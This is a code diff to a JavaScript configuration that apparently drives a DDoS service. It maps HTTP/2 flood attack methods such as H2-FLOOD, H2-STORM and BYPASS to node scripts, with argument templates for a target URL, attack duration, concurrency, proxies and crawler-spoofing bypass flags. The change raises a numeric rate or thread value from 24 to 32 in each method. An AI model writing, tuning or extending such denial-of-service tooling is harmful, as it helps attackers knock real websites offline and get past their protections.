@@ -8,22 +8,22 @@ const methodMap = {
   "H2-STORM": {
     script: "ciko.js",
     executor: "node",
-    argsTemplate: ["<url>", "<time>", "24", "<concurrents>", "<proxy>"]
+    argsTemplate: ["<url>", "<time>", "32", "<concurrents>", "<proxy>"]
   },
   "H2-ENVY": {
     script: "jawa14.js",
     executor: "node",
-    argsTemplate: ["GET", "<url>", "<time>", "<concurrents>", "24", "<proxy>", "--bypass", "--googlebot", "--referer", "--secua"]
+    argsTemplate: ["GET", "<url>", "<time>", "<concurrents>", "32", "<proxy>", "--bypass", "--googlebot", "--referer", "--secua"]
   },
   "H2-FLOOD": {
     script: "flood.js",
     executor: "node",
-    argsTemplate: ["<url>", "<time>", "24", "<concurrents>", "<proxy>"]
+    argsTemplate: ["<url>", "<time>", "32", "<concurrents>", "<proxy>"]
   },
   "H2-PID": {
     script: "gjqu4.js",
     executor: "node",
-    argsTemplate: ["GET", "<url>", "<time>", "<concurrents>", "24", "<proxy>"]
+    argsTemplate: ["GET", "<url>", "<time>", "<concurrents>", "32", "<proxy>"]
   },
   "BYPASS": {
     script: "bypass.js",
